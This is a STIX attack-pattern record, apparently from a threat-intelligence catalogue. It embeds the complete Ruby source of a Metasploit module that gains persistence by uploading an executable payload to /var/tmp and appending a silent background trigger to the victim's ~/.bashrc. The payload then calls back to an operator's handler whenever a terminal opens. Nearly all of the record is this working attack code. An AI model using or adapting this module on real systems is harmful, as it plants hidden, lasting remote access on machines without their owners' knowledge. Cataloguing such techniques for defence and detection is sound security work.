{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8c1123ed-a57c-4e8c-bbf5-df76d247e898",
    "created": "2024-08-14T16:59:04.212356Z",
    "modified": "2024-08-14T16:59:04.21236Z",
    "name": "Bash Profile Persistence",
    "description": " This module writes an execution trigger to the target's Bash profile. The execution trigger executes a call back payload whenever the target user opens a Bash terminal. A handler is not run automatically, so you must configure an appropriate exploit/multi/handler to receive the callback.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/bash_profile_persistence.rb",
            "external_id": "bash_profile_persistence.rb"
        },
        {
            "source_name": "reference",
            "url": "https://attack.mitre.org/techniques/T1156/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = NormalRanking\n  include Msf::Post::Common\n  include Msf::Post::File\n  include Msf::Post::Unix\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Bash Profile Persistence',\n        'Description' => %q{\n          This module writes an execution trigger to the target's Bash profile.\n          The execution trigger executes a call back payload whenever the target\n          user opens a Bash terminal. A handler is not run automatically, so you\n          must configure an appropriate exploit/multi/handler to receive the callback.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Michael Long <bluesentinel[at]protonmail.com>'\n        ],\n        'DisclosureDate' => '1989-06-08', # First public release of Bourne Again Shell\n        'Platform' => ['unix', 'linux'],\n        'Arch' => ARCH_CMD,\n        'SessionTypes' => ['meterpreter', 'shell'],\n        'DefaultOptions' => { 'WfsDelay' => 0, 'DisablePayloadHandler' => true },\n        'Targets' => [\n          ['Automatic', {}]\n        ],\n        'DefaultTarget' => 0,\n        'Payload' => {\n          'Compat' =>\n          {\n            'PayloadType' => 'cmd',\n            'Meterpreter' => {\n              'Commands' => %w[\n                stdapi_sys_config_sysinfo\n              ]\n            }\n          }\n        },\n        'References' => [\n          ['URL', 'https://attack.mitre.org/techniques/T1156/']\n        ],\n        'Notes' => {\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'Stability' => [ CRASH_SAFE ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK, CONFIG_CHANGES ]\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('BASH_PROFILE', [true, 'Target Bash profile location. Usually ~/.bashrc or ~/.bash_profile.', '~/.bashrc']),\n        OptString.new('PAYLOAD_DIR', [true, 'Directory to write persistent payload file.', '/var/tmp/'])\n      ]\n    )\n  end\n\n  def exploit\n    # expand home directory path (i.e. '~/.bashrc' becomes '/home/user/.bashrc')\n    profile_path = datastore['BASH_PROFILE']\n    if profile_path.start_with?('~/')\n      home_directory = get_env('$HOME')\n      profile_path.sub!(/^~/, home_directory)\n    end\n\n    # check that target Bash profile file exists\n    unless exist?(profile_path)\n      fail_with Failure::NotFound, profile_path\n    end\n    print_good(\"Bash profile exists: #{profile_path}\")\n\n    # check that target Bash profile file is writable\n    unless writable?(profile_path)\n      fail_with Failure::NoAccess, profile_path\n    end\n    print_good(\"Bash profile is writable: #{profile_path}\")\n\n    # create Bash profile backup on local system before persistence is added\n    backup_profile = read_file(profile_path)\n    backup_profile_path = create_backup_file(backup_profile)\n    print_status(\"Created backup Bash profile: #{backup_profile_path}\")\n\n    # upload persistent payload to target and make executable (chmod 700)\n    payload_file = datastore['PAYLOAD_DIR'] + Rex::Text.rand_text_alpha(10..16)\n    upload_and_chmodx(payload_file, payload.encoded)\n\n    # write payload trigger to Bash profile\n    exec_payload_string = \"#{payload_file} > /dev/null 2>&1 &\" + \"\\n\" # send stdin,out,err to /dev/null\n    append_file(profile_path, exec_payload_string)\n    print_good('Created Bash profile persistence')\n    print_status('Payload will be triggered when target opens a Bash terminal')\n    print_warning(\"Don't forget to start your handler:\")\n    print_warning(\"msf> handler -H #{datastore['LHOST']} -P #{datastore['LPORT']} -p #{datastore['PAYLOAD']}\")\n  end\n\n  # create a backup copy of the target's Bash profile on the local system before persistence is added\n  def create_backup_file(backup_profile)\n    begin\n      hostname = session.sys.config.sysinfo['Computer']\n    rescue NoMethodError\n      hostname = cmd_exec('hostname')\n    end\n\n    timestamp = '_' + ::Time.now.strftime('%Y%m%d.%H%M%S')\n\n    log_directory_name = ::File.join(Msf::Config.log_directory, 'persistence/' + hostname + timestamp)\n\n    ::FileUtils.mkdir_p(log_directory_name)\n\n    log_file_name = log_directory_name + '/Bash_Profile.backup'\n    file_local_write(log_file_name, backup_profile)\n    return log_file_name\n  end\nend\n",
    "x_mitre_disclosure_date": "1989-06-08, # First public release of Bourne Again Shell",
    "x_mitre_platforms": [
        "['unix', 'linux']"
    ]
}